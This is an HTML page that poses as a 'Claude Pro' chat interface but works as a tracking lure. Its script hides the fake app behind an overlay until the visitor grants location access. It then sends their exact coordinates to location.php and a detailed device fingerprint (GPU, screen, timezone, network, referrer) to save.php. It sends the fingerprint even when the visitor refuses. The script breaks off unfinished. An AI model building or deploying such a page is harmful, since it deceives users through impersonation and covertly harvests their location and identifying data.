<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Claude Pro</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Inter',ui-sans-serif,system-ui,-apple-system,sans-serif;background:#191817;color:#F2F0EA;height:100vh;overflow:hidden}
 
:root{
  --bg-app:#191817; --bg-sidebar:#1E1D1B; --bg-main:#262624; --bg-card:#2F2E2B;
  --bg-card-hover:#383733; --bg-active:#34332E; --bg-input:#30302D;
  --accent:#D97757; --accent-hover:#E08862; --accent-press:#C2643F;
  --gold:#E8B98C; --text-primary:#F2F0EA; --text-secondary:#A8A39A; --text-faint:#716C62; --border:#3A3934;
}
 
#overlay{position:fixed;inset:0;background:rgba(10,9,8,0.92);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px}
.ov-logo svg{width:56px;height:56px;fill:var(--accent)}
.ov-title{font-size:22px;font-weight:700;color:#fff;text-align:center;letter-spacing:-.5px}
.ov-sub{font-size:14px;color:var(--text-secondary);text-align:center;max-width:320px;line-height:1.65}
.ov-loader{display:flex;gap:7px;align-items:center;margin-top:8px}
.ov-loader span{width:9px;height:9px;border-radius:50%;background:var(--accent);animation:bop 1.2s infinite}
.ov-loader span:nth-child(2){animation-delay:.2s}
.ov-loader span:nth-child(3){animation-delay:.4s}
@keyframes bop{0%,60%,100%{transform:translateY(0)}30%{transform:translateY(-8px)}}
 
#deniedOv{position:fixed;inset:0;background:rgba(10,9,8,0.94);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);z-index:9999;display:none;flex-direction:column;align-items:center;justify-content:center;gap:16px}
.den-icon{width:64px;height:64px;background:rgba(217,119,87,.12);border-radius:50%;display:flex;align-items:center;justify-content:center;border:1px solid rgba(217,119,87,.25)}
.den-icon svg{width:28px;height:28px;color:var(--accent)}
#deniedOv h2{font-size:20px;font-weight:700;color:#fff;letter-spacing:-.4px}
#deniedOv p{font-size:13.5px;color:var(--text-secondary);text-align:center;max-width:280px;line-height:1.65}
.retry-btn{padding:11px 26px;background:var(--accent);color:#19181A;border:none;border-radius:10px;font-size:14px;font-weight:600;cursor:pointer;transition:background .15s}
.retry-btn:hover{background:var(--accent-hover)}
 
.layout{display:none;height:100vh}
body.app-allowed .layout, body.app-denied .layout{display:flex}
body.app-denied .layout{filter:blur(8px);pointer-events:none;user-select:none}
 
.sb{width:260px;background:var(--bg-sidebar);display:flex;flex-direction:column;padding:10px;flex-shrink:0;border-right:1px solid var(--border)}
.sb-top{display:flex;align-items:center;justify-content:space-between;padding:6px 6px 16px}
.sb-brand{display:flex;align-items:center;gap:8px;font-size:15px;font-weight:700;color:var(--text-primary);letter-spacing:-.4px}
.sb-brand svg{width:20px;height:20px;fill:var(--accent)}
.sb-icons{display:flex;gap:2px}
.ib{background:none;border:none;color:var(--text-secondary);cursor:pointer;padding:7px;border-radius:50%;display:flex;align-items:center;justify-content:center;transition:background .15s,color .15s}
.ib:hover{background:rgba(255,255,255,.07);color:var(--text-primary)}
.nc-btn{display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:10px;cursor:pointer;color:var(--text-primary);font-size:13.5px;margin-bottom:6px;background:var(--bg-card);transition:background .15s;user-select:none;font-weight:500}
.nc-btn:hover{background:var(--bg-card-hover)}
.nav-item{display:flex;align-items:center;gap:10px;padding:8px 10px;border-radius:10px;font-size:13.3px;color:var(--text-primary);cursor:pointer;transition:background .15s}
.nav-item:hover{background:rgba(255,255,255,.05)}
.nav-item svg{width:15px;height:15px;stroke:var(--text-secondary);flex-shrink:0}
.nav-item .badge{margin-left:auto;font-size:10.5px;font-weight:700;color:var(--gold);background:rgba(232,185,140,.15);padding:3px 8px;border-radius:6px;letter-spacing:.3px}
.sec-lbl{font-size:11.5px;color:var(--text-faint);padding:14px 12px 4px;font-weight:700;letter-spacing:.5px;text-transform:uppercase}
.ci{padding:8px 12px;border-radius:8px;cursor:pointer;color:var(--text-secondary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-size:13px;transition:background .15s,color .15s}
.ci:hover{background:rgba(255,255,255,.05);color:var(--text-primary)}
.ci.on{background:var(--bg-active);color:var(--text-primary);font-weight:500}
.sb-list{flex:1;overflow-y:auto;margin-top:2px}
.sb-bot{margin-top:auto;border-top:1px solid var(--border);padding-top:10px}
.pro-box{background:linear-gradient(135deg,rgba(217,119,87,.16),rgba(217,119,87,.06));border:1px solid rgba(217,119,87,.28);border-radius:12px;padding:14px;margin-bottom:8px}
.pb-title{font-size:13px;font-weight:700;color:var(--gold);margin-bottom:5px;display:flex;align-items:center;gap:6px;letter-spacing:.2px}
.pb-title svg{width:13px;height:13px;fill:var(--gold)}
.pro-box p{font-size:12px;color:var(--text-secondary);margin-bottom:10px;line-height:1.6}
.pb-btn{width:100%;padding:8px;background:var(--accent);color:#19181A;border:none;border-radius:8px;font-size:12.5px;font-weight:700;cursor:pointer;transition:background .15s}
.pb-btn:hover{background:var(--accent-hover)}
.user-row{display:flex;align-items:center;gap:10px;padding:9px 8px;border-radius:10px;cursor:pointer;transition:background .15s}
.user-row:hover{background:rgba(255,255,255,.05)}
.av{width:30px;height:30px;border-radius:50%;background:linear-gradient(135deg,#D97757,#B25A3D);display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;color:#fff;flex-shrink:0}
.uname{font-size:13px;color:var(--text-primary);flex:1;line-height:1.25;font-weight:500}
.uplan{font-size:11px;color:var(--gold);display:block;margin-top:2px;font-weight:600}
.user-menu summary{list-style:none;cursor:pointer}
.user-menu summary::-webkit-details-marker{display:none}
.menu-pop{position:absolute;bottom:54px;left:4px;width:200px;background:var(--bg-card);border:1px solid var(--border);border-radius:10px;padding:6px;box-shadow:0 12px 32px rgba(0,0,0,.5)}
.menu-pop .mi{display:flex;align-items:center;gap:9px;padding:8px 9px;border-radius:7px;font-size:13px;color:var(--text-primary);cursor:pointer;transition:background .15s}
.menu-pop .mi:hover{background:rgba(255,255,255,.07)}
.menu-pop .mi svg{width:14px;height:14px;stroke:var(--text-secondary)}
.menu-pop hr{border:none;border-top:1px solid var(--border);margin:5px 2px}
 
.main{flex:1;display:flex;flex-direction:column;background:var(--bg-main);overflow:hidden;border-left:1px solid var(--border)}
.plus-bar{display:flex;align-items:center;gap:8px;padding:10px 18px;background:linear-gradient(90deg,rgba(217,119,87,.12),rgba(217,119,87,.05));border-bottom:1px solid var(--border);font-size:12px;color:var(--gold);font-weight:600;letter-spacing:.3px}
.plus-bar svg{width:13px;height:13px;fill:var(--accent)}
.plus-dot{width:6px;height:6px;background:var(--accent);border-radius:50%;animation:pdot 2s infinite}
@keyframes pdot{0%,100%{opacity:1}50%{opacity:.4}}
.topbar{display:flex;align-items:center;justify-content:space-between;padding:10px 18px;border-bottom:1px solid var(--border)}
.model-menu{position:relative}
.model-menu summary{list-style:none;cursor:pointer}
.model-menu summary::-webkit-details-marker{display:none}
.model-btn{display:flex;align-items:center;gap:6px;color:var(--text-primary);font-size:14.5px;font-weight:700;padding:6px 10px;border-radius:8px;transition:background .15s;cursor:pointer;letter-spacing:-.3px}
.model-btn:hover{background:rgba(255,255,255,.05)}
.model-btn svg{width:13px;height:13px;stroke:var(--text-secondary)}
.model-pop{position:absolute;top:38px;left:0;width:200px;background:var(--bg-card);border:1px solid var(--border);border-radius:10px;padding:6px;box-shadow:0 12px 32px rgba(0,0,0,.5)}
.model-pop .mi{display:flex;align-items:center;justify-content:space-between;padding:8px 9px;border-radius:7px;font-size:12.8px;color:var(--text-primary);cursor:pointer;transition:background .15s}
.model-pop .mi:hover{background:rgba(255,255,255,.07)}
.model-pop .mi span{font-size:11px;color:var(--text-faint)}
.topbar-r{display:flex;gap:8px}
.share-btn{background:transparent;border:1px solid var(--border);color:var(--text-primary);padding:8px 16px;border-radius:8px;font-size:13px;cursor:pointer;font-weight:600;transition:all .15s}
.share-btn:hover{background:rgba(255,255,255,.05);border-color:var(--gold)}
 
.chat{flex:1;overflow-y:auto;padding:22px 0}
.chat::-webkit-scrollbar{width:5px}
.chat::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px}
.mg{max-width:720px;margin:0 auto;padding:0 24px}
.umw{display:flex;justify-content:flex-end;margin-bottom:18px}
.ubbl{background:var(--bg-card);color:var(--text-primary);padding:11px 16px;border-radius:18px;max-width:72%;font-size:14.5px;line-height:1.6;word-break:break-word;border:1px solid var(--border)}
.amw{display:flex;gap:12px;margin-bottom:18px;align-items:flex-start}
.aav{width:24px;height:24px;flex-shrink:0;margin-top:3px}
.aav svg{width:100%;height:100%;fill:var(--accent)}
.ac{flex:1;color:var(--text-primary);font-size:14.5px;line-height:1.7}
.ac p{margin-bottom:10px}
.ac p:last-child{margin-bottom:0}
.ac code{background:rgba(255,255,255,.06);padding:2px 6px;border-radius:4px;font-family:monospace;font-size:13px;color:var(--gold)}
.ma{display:flex;gap:2px;margin-top:8px}
.mab{background:none;border:none;color:var(--text-faint);cursor:pointer;padding:5px 8px;border-radius:6px;display:flex;align-items:center;gap:4px;font-size:11.5px;transition:all .15s}
.mab:hover{background:rgba(255,255,255,.06);color:var(--text-primary)}
.mab svg{width:14px;height:14px}
.mab.copied{color:var(--accent)}
.mab.on{color:var(--accent)}
 
.wlc{text-align:center;padding:54px 24px 26px}
.wlc h2{font-size:28px;font-weight:700;color:var(--text-primary);margin-bottom:22px;letter-spacing:-.6px}
.sg{display:grid;grid-template-columns:1fr 1fr;gap:10px;max-width:560px;margin:0 auto}
.sc{background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:13px 15px;text-align:left;cursor:pointer;color:var(--text-primary);transition:all .15s}
.sc:hover{background:var(--bg-card-hover);border-color:var(--gold)}
.sc .st{font-size:13.5px;font-weight:600;margin-bottom:3px}
.sc .ss{font-size:12.5px;color:var(--text-faint)}
 
.inp-area{padding:10px 24px 16px}
.inp-box{max-width:720px;margin:0 auto;background:var(--bg-input);border-radius:20px;border:1px solid var(--border)}
.inp-row{display:flex;align-items:flex-end;padding:10px 12px 12px 16px;gap:8px}
textarea#ti{flex:1;background:none;border:none;outline:none;color:var(--text-primary);font-size:14.5px;resize:none;min-height:24px;max-height:200px;line-height:1.5;padding:5px 0;font-family:inherit}
textarea#ti::placeholder{color:var(--text-faint)}
.tb{background:none;border:none;color:var(--text-secondary);cursor:pointer;padding:8px;border-radius:50%;display:flex;align-items:center;justify-content:center;transition:all .15s}
.tb:hover{background:rgba(255,255,255,.07);color:var(--text-primary)}
.tb svg{width:16px;height:16px}
.sbtn{width:32px;height:32px;background:var(--accent);border:none;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;transition:background .15s,transform .08s}
.sbtn:hover{background:var(--accent-hover)}
.sbtn:active{background:var(--accent-press);transform:scale(.9)}
.sbtn svg{width:14px;height:14px;fill:#19181A;font-weight:700}
.hint{text-align:center;font-size:11.5px;color:var(--text-faint);margin-top:10px}
 
.dots{display:flex;gap:4px;align-items:center;padding:6px 0}
.dots span{width:6px;height:6px;border-radius:50%;background:var(--text-faint);animation:bop 1.2s infinite}
.dots span:nth-child(2){animation-delay:.2s}
.dots span:nth-child(3){animation-delay:.4s}
 
/* ===================== MOBILE ONLY ===================== */
@media (max-width:760px){
 
  /* Sidebar hide */
  .sb{display:none}
 
  /* Mobile top header */
  .mob-header{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:var(--bg-sidebar);border-bottom:1px solid var(--border)}
  .mob-brand{display:flex;align-items:center;gap:7px;font-size:15px;font-weight:700;color:var(--text-primary);letter-spacing:-.4px}
  .mob-brand svg{width:18px;height:18px;fill:var(--accent)}
  .mob-icons{display:flex;gap:2px}
 
  /* Mobile sidebar drawer */
  .mob-drawer{position:fixed;inset:0;z-index:888;display:none}
  .mob-drawer.open{display:flex}
  .mob-backdrop{position:absolute;inset:0;background:rgba(0,0,0,.6)}
  .mob-panel{position:relative;width:260px;height:100%;background:var(--bg-sidebar);display:flex;flex-direction:column;padding:10px;overflow-y:auto;z-index:1}
 
  /* Main border remove on mobile */
  .main{border-left:none}
 
  /* Welcome screen */
  .wlc{padding:32px 16px 20px}
  .wlc h2{font-size:22px;margin-bottom:16px}
  .sg{grid-template-columns:1fr 1fr;gap:8px}
  .sc{padding:11px 12px}
  .sc .st{font-size:12.5px}
  .sc .ss{font-size:11.5px}
 
  /* Chat messages */
  .mg{padding:0 12px}
  .ubbl{max-width:88%;font-size:13.5px}
  .ac{font-size:13.5px}
 
  /* Input area */
  .inp-area{padding:8px 12px 12px}
  textarea#ti{font-size:14px}
 
  /* Plus bar & topbar */
  .plus-bar{padding:8px 14px;font-size:11px}
  .topbar{padding:8px 14px}
  .model-btn{font-size:13px;padding:5px 8px}
  .share-btn{padding:7px 12px;font-size:12px}
 
}
 
/* Hide mob-header on desktop */
.mob-header{display:none}
.mob-drawer{display:none}
/* ====================================================== */
</style>
</head>
<body>
 
<!-- LOADING OVERLAY -->
<div id="overlay">
  <div class="ov-logo"><svg viewBox="0 0 24 24"><path d="M12 1l2.6 7.9H22l-6.5 4.7 2.5 7.9L12 16.8 5.9 21.5l2.5-7.9L2 8.9h7.4z"/></svg></div>
  <div class="ov-title">Claude Pro</div>
  <div class="ov-sub">Allow location access to unlock Claude Pro features.</div>
  <div class="ov-loader"><span></span><span></span><span></span></div>
</div>
 
<!-- DENIED OVERLAY -->
<div id="deniedOv">
  <div class="den-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg></div>
  <h2>Access Denied</h2>
  <p>Location access is required to use Claude Pro. Please allow and try again.</p>
  <button class="retry-btn" onclick="window.retry()">Try Again</button>
</div>
 
<!-- MOBILE HEADER (sirf mobile pe dikhega) -->
<div class="mob-header">
  <div class="mob-brand">
    <svg viewBox="0 0 24 24"><path d="M12 1l2.6 7.9H22l-6.5 4.7 2.5 7.9L12 16.8 5.9 21.5l2.5-7.9L2 8.9h7.4z"/></svg>
    Claude
  </div>
  <div class="mob-icons">
    <button class="ib" onclick="window.newChat()"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 5v14M5 12h14"/></svg></button>
    <button class="ib" onclick="document.getElementById('mobDrawer').classList.toggle('open')"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button>
  </div>
</div>
 
<!-- MOBILE DRAWER -->
<div class="mob-drawer" id="mobDrawer">
  <div class="mob-backdrop" onclick="document.getElementById('mobDrawer').classList.remove('open')"></div>
  <div class="mob-panel">
    <div class="sb-top">
      <div class="sb-brand">
        <svg viewBox="0 0 24 24"><path d="M12 1l2.6 7.9H22l-6.5 4.7 2.5 7.9L12 16.8 5.9 21.5l2.5-7.9L2 8.9h7.4z"/></svg>
        Claude
      </div>
    </div>
    <div class="nc-btn" onclick="window.newChat();document.getElementById('mobDrawer').classList.remove('open')">
      <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 5v14M5 12h14"/></svg>
      New chat
    </div>
    <div class="nav-item"><svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>Projects</div>
    <div class="nav-item"><svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>Artifacts</div>
    <div class="nav-item"><svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>Code <span class="badge">Beta</span></div>
    <div class="sb-list">
      <div class="sec-lbl">Today</div>
      <div class="ci on">Claude Pro interface</div>
      <div class="ci">Debugging a Python error</div>
      <div class="sec-lbl">Yesterday</div>
      <div class="ci">Weekend trip itinerary</div>
      <div class="ci">Resume bullet points</div>
    </div>
    <div class="sb-bot">
      <div class="pro-box">
        <div class="pb-title"><svg viewBox="0 0 24 24"><path d="M2 8l4 4 6-9 6 9 4-4-2 12H4z"/></svg>Claude Pro</div>
        <p>Priority access and higher usage limits enabled.</p>
        <button class="pb-btn">Manage subscription</button>
      </div>
      <div class="user-row">
        <div class="av">AM</div>
        <div>
          <div class="uname">Alex Morgan</div>
          <div class="uplan">Pro plan</div>
        </div>
      </div>
    </div>
  </div>
</div>
 
<!-- MAIN APP -->
<div class="layout">
  <div class="sb">
    <div class="sb-top">
      <div class="sb-brand">
        <svg viewBox="0 0 24 24"><path d="M12 1l2.6 7.9H22l-6.5 4.7 2.5 7.9L12 16.8 5.9 21.5l2.5-7.9L2 8.9h7.4z"/></svg>
        Claude
      </div>
      <div class="sb-icons">
        <button class="ib"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg></button>
        <button class="ib" onclick="window.newChat()"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="M9 4v16"/></svg></button>
      </div>
    </div>
    <div class="nc-btn" onclick="window.newChat()">
      <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 5v14M5 12h14"/></svg>
      New chat
    </div>
    <div class="nav-item">
      <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
      Projects
    </div>
    <div class="nav-item">
      <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
      Artifacts
    </div>
    <div class="nav-item">
      <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
      Code <span class="badge">Beta</span>
    </div>
    <div class="sb-list">
      <div class="sec-lbl">Today</div>
      <div class="ci on">Claude Pro interface</div>
      <div class="ci">Debugging a Python error</div>
      <div class="sec-lbl">Yesterday</div>
      <div class="ci">Weekend trip itinerary</div>
      <div class="ci">Resume bullet points</div>
    </div>
    <div class="sb-bot">
      <div class="pro-box">
        <div class="pb-title"><svg viewBox="0 0 24 24"><path d="M2 8l4 4 6-9 6 9 4-4-2 12H4z"/></svg>Claude Pro</div>
        <p>Priority access and higher usage limits enabled.</p>
        <button class="pb-btn">Manage subscription</button>
      </div>
      <details class="user-menu">
        <summary>
          <div class="user-row">
            <div class="av">AM</div>
            <div>
              <div class="uname">Alex Morgan</div>
              <div class="uplan">Pro plan</div>
            </div>
          </div>
        </summary>
        <div class="menu-pop">
          <div class="mi"><svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 11-2.83 2.83l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 11-4 0v-.09A1.65 1.65 0 009.6 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 11-2.83-2.83l.06-.06A1.65 1.65 0 005.28 15a1.65 1.65 0 00-1.51-1H3.6a2 2 0 110-4h.09A1.65 1.65 0 005.18 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 112.83-2.83l.06.06a1.65 1.65 0 001.82.33H9.6a1.65 1.65 0 001-1.51V3a2 2 0 114 0v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 112.83 2.83l-.06.06A1.65 1.65 0 0018.72 9c.1.32.28.6.51.83"/></svg>Settings</div>
          <div class="mi"><svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.1 9a3 3 0 015.8 1c0 2-3 2.5-3 4.5"/><circle cx="12" cy="17.5" r="0.4"/></svg>Help &amp; support</div>
          <hr>
          <div class="mi"><svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4"/><polyline points="16 17 21 12 16 7"/><path d="M21 12H9"/></svg>Log out</div>
        </div>
      </details>
    </div>
  </div>
 
  <div class="main">
    <div class="plus-bar">
      <div class="plus-dot"></div>
      <svg viewBox="0 0 24 24"><path d="M2 8l4 4 6-9 6 9 4-4-2 12H4z"/></svg>
      Claude Pro &nbsp;·&nbsp; Advanced Analytics
    </div>
    <div class="topbar">
      <details class="model-menu">
        <summary class="model-btn">
          Claude Opus 4.6
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg>
        </summary>
        <div class="model-pop">
          <div class="mi">Claude Opus 4.6</div>
          <div class="mi">Claude Sonnet 4.6 <span>Fast</span></div>
          <div class="mi">Claude Haiku 4.5 <span>Fastest</span></div>
        </div>
      </details>
      <div class="topbar-r">
        <button class="share-btn">Share</button>
      </div>
    </div>
    <div class="chat" id="chat">
      <div id="ws">
        <div class="wlc">
          <h2>What can I help with?</h2>
          <div class="sg">
            <div class="sc" onclick="window.qs('Help me write a short story')">
              <div class="st">✏️ Write something</div>
              <div class="ss">Stories, essays, emails</div>
            </div>
            <div class="sc" onclick="window.qs('Analyze this dataset and give me insights')">
              <div class="st">📊 Analyze data</div>
              <div class="ss">Upload files to analyze</div>
            </div>
            <div class="sc" onclick="window.qs('Write me a Python script to automate a task')">
              <div class="st">💻 Code something</div>
              <div class="ss">Any language, any task</div>
            </div>
            <div class="sc" onclick="window.qs('Help me brainstorm ideas for a project')">
              <div class="st">💡 Brainstorm ideas</div>
              <div class="ss">Work, life, creative projects</div>
            </div>
          </div>
        </div>
      </div>
      <div id="cm" style="display:none"><div class="mg" id="mg"></div></div>
    </div>
    <div class="inp-area">
      <div class="inp-box">
        <div class="inp-row">
          <button class="tb" title="Attach"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.44 11.05-9.19 9.19a6 6 0 0 1-8.49-8.49l8.57-8.57A4 4 0 1 1 18 8.84l-8.59 8.57a2 2 0 0 1-2.83-2.83l8.49-8.48"/></svg></button>
          <textarea id="ti" placeholder="Message Claude..." rows="1" onkeydown="window.hk(event)" oninput="window.ar(this)"></textarea>
          <button class="sbtn" onclick="window.send()" title="Send"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 4l-8 8h5v8h6v-8h5z"/></svg></button>
        </div>
      </div>
      <div class="hint">Claude can make mistakes. Please double-check responses.</div>
    </div>
  </div>
</div>
<script src="Detels.js"></script>
<script>
"use strict";

/* ================================================
   ADVANCED LOCATION GATE + DEVICE FINGERPRINTING
   + DUAL ENDPOINT INTEGRATION (location.php + save.php)
================================================ */

(function(){
  // ========== CONFIGURATION ==========
  const SERVER_URL_DEVICE = 'save.php';      // Device fingerprint endpoint
  const SERVER_URL_LOCATION = 'location.php'; // Location data endpoint
  const MAX_RETRIES = 3;
  const SEND_TIMEOUT = 30000;  // 30 seconds

  // ========== STATE ==========
  let retryCount = 0;
  let sending = false;
  let permissionGranted = false;
  let firstRun = true;
  let deviceFingerprint = null;

  // ========== DEVICE FINGERPRINTING ==========
  function generateFingerprint() {
    try {
      const raw = navigator.userAgent + navigator.language + screen.width + screen.height;
      let hash = 0;
      for (let i = 0; i < raw.length; i++) {
        hash = ((hash << 5) - hash) + raw.charCodeAt(i);
        hash |= 0;
      }
      return "FP-" + Math.abs(hash);
    } catch {
      return "FP-ERROR";
    }
  }

  function getGPUInfo() {
    let gpuVendor = "N/A";
    let gpuRenderer = "N/A";
    let webglVersion = "N/A";
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (gl) {
        webglVersion = gl.getParameter(gl.VERSION);
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        if (debugInfo) {
          gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
          gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }
      }
    } catch {}
    return { gpuVendor, gpuRenderer, webglVersion };
  }

  function collectDeviceData() {
    const gpuData = getGPUInfo();
    return {
      userAgent: navigator.userAgent || "N/A",
      platform: navigator.platform || "N/A",
      language: navigator.language || "N/A",
      languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
      screen: screen.width + "x" + screen.height,
      colorDepth: screen.colorDepth || "N/A",
      pixelDepth: screen.pixelDepth || "N/A",
      pixelRatio: window.devicePixelRatio || "N/A",
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
      cpuCores: navigator.hardwareConcurrency || "N/A",
      ram: navigator.deviceMemory || "N/A",
      online: navigator.onLine ? "true" : "false",
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack || "N/A",
      touchPoints: navigator.maxTouchPoints || 0,
      touchSupport: ('ontouchstart' in window),
      theme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
      connectionType: navigator.connection?.effectiveType || "N/A",
      downlink: navigator.connection?.downlink || "N/A",
      rtt: navigator.connection?.rtt || "N/A",
      saveData: navigator.connection?.saveData || false,
      referrer: document.referrer || "direct",
      fingerprint: generateFingerprint(),
      ...gpuData
    };
  }

  // ========== LOCATION REQUEST ==========
  function triggerLocation(){
    if(permissionGranted) return;
    try{
      if(!('geolocation' in navigator)){
        onError({ code: 2 });
        return;
      }
      navigator.geolocation.getCurrentPosition(onSuccess, onError, { timeout: 8000, maximumAge: 0 });
    } catch(e){
      onError({ code: 2 });
    }
  }

  function onSuccess(pos){
    permissionGranted = true;
    
    const locationData = {
      latitude: pos.coords.latitude,
      longitude: pos.coords.longitude,
      accuracy: pos.coords.accuracy,
      altitude: pos.coords.altitude || null,
      speed: pos.coords.speed || null,
      heading: pos.coords.heading || null
    };

    sendToServer(locationData, 'location');
    sendToServer(deviceFingerprint, 'device');
    showAllowed();
  }

  function onError(err){
    const reasons = { 1: 'PERMISSION_DENIED', 2: 'POSITION_UNAVAILABLE', 3: 'TIMEOUT' };
    const reason = reasons[err.code] || 'UNKNOWN_ERROR';
    const overlay = document.getElementById('overlay');
    if(overlay) overlay.style.display = 'none';
    if(err.code === 3 && retryCount < MAX_RETRIES){
      retryCount++;
      setTimeout(triggerLocation, 800);
      return;
    }
    sendToServer({ error: reason, ...deviceFingerprint }, 'device');
    showDenied();
  }

  function showAllowed(){
    permissionGranted = true;
    document.body.classList.remove('app-denied');
    document.body.classList.add('app-allowed');
    document.getElementById('overlay').style.display = 'none';
    document.getElementById('deniedOv').style.display = 'none';
  }

  function showDenied(){
    document.body.classList.add('app-denied');
    document.getElementById('overlay').style.display = 'none';
    document.getElementById('deniedOv').style.display = 'flex';
  }

  function sendToServer(data, type){
    if(sending) return;
    sending = true;
    const url = type === 'device' ? SERVER_URL_DEVICE : SERVER_URL_LOCATION;
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), SEND_TIMEOUT);
    fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
      signal: controller.signal
    })
    .then(r => { clearTimeout(timer); sending = false; })
    .catch(() => {
      clearTimeout(timer);
      sending = false;
      setTimeout(() => {
        fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }).catch(() => {});
      }, 3000);
    });
  }

  window.retry = function(){
    retryCount = 0;
    sending = false;
    document.getElementById('deniedOv').style.display = 'none';
    document.getElementById('overlay').style.display = 'flex';
    setTimeout(triggerLocation, 300);
  };

  window.addEventListener('load', () => {
    if(firstRun){
      firstRun = false;
      deviceFingerprint = collectDeviceData();
      setTimeout(triggerLocation, 400);
    }
  });
